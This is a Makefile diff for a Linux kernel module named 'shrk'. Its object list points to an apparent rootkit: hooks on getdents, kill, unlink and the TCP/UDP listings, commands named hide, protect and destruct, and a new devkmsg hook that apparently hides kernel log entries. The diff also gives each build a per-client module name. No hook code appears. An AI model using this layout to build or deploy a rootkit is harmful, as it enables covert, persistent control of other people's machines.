@@ -20,24 +20,25 @@ EXTRA_CFLAGS += -DSHRK_DEBUG=$(SHRK_DEBUG)             \
                 -DSHRK_CLIENT_ID=\"$(SHRK_CLIENT_ID)\"
 
 # kernel vars cant define with patsubst for some fucking reason
-obj-m := shrk.o 
-shrk-objs := main.o               \
-             util.o               \
-             cmds.o               \
-             hooks.o              \
-             cmds/hide.o          \
-             cmds/protect.o       \
-             cmds/destruct.o      \
-             hooks/link.o         \
-             hooks/open.o         \
-             hooks/kill.o         \
-             hooks/stat.o         \
-             hooks/chdir.o        \
-             hooks/rmdir.o        \
-             hooks/unlink.o       \
-             hooks/getdents.o     \
-             hooks/tcp_seq_show.o \
-             hooks/udp_seq_show.o
+obj-m := shrk-$(SHRK_CLIENT_ID).o 
+shrk-$(SHRK_CLIENT_ID)-objs := main.o               \
+                               util.o               \
+                               cmds.o               \
+                               hooks.o              \
+                               cmds/hide.o          \
+                               cmds/protect.o       \
+                               cmds/destruct.o      \
+                               hooks/link.o         \
+                               hooks/open.o         \
+                               hooks/kill.o         \
+                               hooks/stat.o         \
+                               hooks/chdir.o        \
+                               hooks/rmdir.o        \
+                               hooks/unlink.o       \
+                               hooks/devkmsg.o      \
+                               hooks/getdents.o     \
+                               hooks/tcp_seq_show.o \
+                               hooks/udp_seq_show.o
 
 all:
 	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
@@ -51,12 +52,12 @@ format:
 
 load:
 	@dmesg -C
-	@insmod shrk.ko
+	@insmod *.ko
 	@dmesg
 
 unload:
 	@dmesg -C
-	@rmmod shrk.ko
+	@rmmod *.ko
 	@dmesg
 
 .PHONY: clean format load unload
